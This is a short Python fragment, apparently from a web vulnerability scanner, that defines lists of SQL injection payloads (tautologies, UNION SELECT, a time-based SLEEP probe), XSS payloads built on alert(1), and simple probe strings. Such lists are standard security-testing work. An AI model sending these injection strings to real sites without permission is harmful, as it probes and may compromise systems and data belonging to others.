SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "\" OR 1=1--",
    "' UNION SELECT null--",
    "' AND SLEEP(5)--",
]

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>"
]

ACTIVE_PAYLOADS = [
    "test",
    "<h1>test</h1>",
    "'",
    "\"",
    "<>"
]